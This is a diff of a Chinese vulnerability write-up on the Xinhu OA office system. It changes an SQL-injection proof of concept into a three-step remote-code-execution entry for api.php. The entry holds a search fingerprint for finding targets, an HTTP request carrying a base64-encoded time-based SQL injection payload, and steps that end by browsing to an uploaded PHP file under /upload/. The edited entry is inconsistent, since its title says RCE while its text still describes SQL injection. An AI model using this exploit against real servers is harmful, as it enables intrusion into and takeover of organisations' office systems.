@@ -1,4 +1,4 @@
-# 信呼OA办公系统后台uploadAction存在SQL注入
+# 信呼OA办公系统后台api.php接口存在RCE
 
 信呼OA办公系统是一个开源的在线办公系统。 信呼OA办公系统uploadAction存在SQL注入漏洞，攻击者可利用该漏洞获取数据库敏感信息。
 
@@ -8,7 +8,7 @@
 icon_hash="1652488516"
 ```
 
-## poc
+## 第一步
 
 ```javascript
 GET /xhoa/api.php?a=getmfilv&m=upload|api&d=task&fileid=1&fname=MScgYW5kIHNsZWVwKDYpIw== HTTP/1.1  
@@ -28,10 +28,19 @@ sec-ch-ua-mobile: ?0
 sec-ch-ua-platform: "Windows"  
 ```
 
-![image-20241128092859877](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202411280928931.png)
+![image](https://github.com/user-attachments/assets/0f95005f-8c4f-45a0-bed2-eba493c7b87a)
 
+## 第二步
 
+```javascript
+访问：http://xxxx/api.php?a=getmfilv&m=upload|api&d=task&fileid=返回的id值
+```
 
-## 漏洞来源
+![image](https://github.com/user-attachments/assets/ba6f7a2e-8c59-4c08-a87f-8f778d2ee1c4)
 
-- https://forum.butian.net/article/613
+## 第三步
+```
+通过前面第二步获取的地址直接访问即可
+http://localhost/upload/2025-03/26_rocktpl5661_1363.php
+```
+
